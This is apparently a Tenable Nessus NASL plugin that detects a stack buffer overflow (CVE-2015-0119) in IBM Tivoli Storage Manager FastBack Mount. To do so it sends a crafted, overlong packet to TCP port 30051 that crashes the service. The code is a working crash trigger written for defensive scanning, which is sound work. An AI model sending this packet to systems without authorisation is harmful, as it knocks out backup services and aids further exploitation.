#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(96143);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2016/12/29 14:22:37 $");

  script_cve_id("CVE-2015-0119");
  script_bugtraq_id(73917);
  script_osvdb_id(120177);
  script_xref(name:"ZDI", value:"ZDI-15-118");

  script_name(english:"IBM Tivoli Storage Manager FastBack Mount CMountDismount::GetVaultDump RCE");
  script_summary(english:"Attempts to terminate the FastBackMount process.");

  script_set_attribute(attribute:"synopsis", value:
"A virtual mount application running on the remote host is affected by
a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The IBM Tivoli Storage Manager (TSM) FastBack Mount application
running on the remote host is affected by a remote code execution
vulnerability in the FastBackServer.exe service due to improper
validation of user-supplied input to the CMountDismount::GetVaultDump
method. An unauthenticated, remote attacker can exploit this, by
sending a crafted packet to TCP port 30051, to cause a stack-based
buffer overflow, resulting in a denial of service condition or the
execution of arbitrary code.

Note that the FastBack Mount application running on the remote host is
reportedly affected by other vulnerabilities as well; however, Nessus
has not tested for them.");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-15-118/");
  # http://www-01.ibm.com/support/docview.wss?uid=swg21699645
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?af253f07");
  script_set_attribute(attribute:"solution", value:
"Upgrade to IBM Tivoli Storage Manager FastBack version 6.1.11.1 or
later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/04/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/04/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/12/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:tivoli_storage_manager_fastback");
  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"General");

  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("ibm_tsm_fastback_mount_detect.nbin");
  script_require_keys("Services/tsm-fastback-mount","Settings/ParanoidReport");

  exit(0);
}

include("byte_func.inc");
include("misc_func.inc");
include("global_settings.inc");
include("audit.inc");
include("dump.inc");

function mk_pkt(type, data)
{
  local_var hdr;

  if(isnull(type))
    type = 1;

  hdr = '\xAA\xBB\xAA\xBB' +          # magic 
      mkdword(strlen(data) + 0x10) +  # pkt length
      mkdword(0xBBBBBBBB) +           # ???
      mkdword(type);                  # pkt type

  return (hdr + data);
}

# Use lack of response to flag vulnerability is not so reliable
if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_service(svc:'tsm-fastback-mount', default:30051, exit_on_fail:TRUE);
soc = open_sock_tcp(port);
if (!soc) 
  audit(AUDIT_SOCK_FAIL, port);

target = 'ip=port=user=pass=safe=';
target += crap(data:'A', length: 0x200 - strlen(target));

body = 
  mkdword(9)                      # opcode for S2M_MOUNT_Dump
  + crap(data:'\x00', length: 8)  # pos: 0; ???
  + '\x00'                        # pos: 8; reparse target
  + crap(data:'\x00', length: 4)  # pos: 9; ???
  + target                        # pos: 0xd; target; fixed size: 0x200 bytes   
  + mkdword(0)                    # pos: 0x20d; type; valid: 0-3
  + mkdword(2)                    # pos: 0x211; for 
  + mkdword(3)                    # pos: 0x215; full
  + mkdword(4);                   # pos: 0x219; OS type 

req = mk_pkt(data:body);
send(socket:soc, data:req);
recv(socket:soc, length:4096); # do not close the socket too soon
close(soc);

# FastBackMount.exe should terminates and restarts
# Send S2M_Mount_Info_request to check
soc = open_sock_tcp(port);
if (soc) 
{
  body = mkdword(7) + crap(data:'A', length:8);                     
  req2 = mk_pkt(data:body);
  send(socket:soc, data:req2);
  res = recv(socket:soc, length: 4096);
  close(soc);
  if (res)
  {
    audit(AUDIT_LISTEN_NOT_VULN,'IBM Tivoli Storage Manager FastBack Mount', port);
  }
}
# Vulnerable: failed to connect or receive a Mount_Info_response 
security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  generic     : TRUE,
  request     : make_list(hexdump(ddata:req))
);
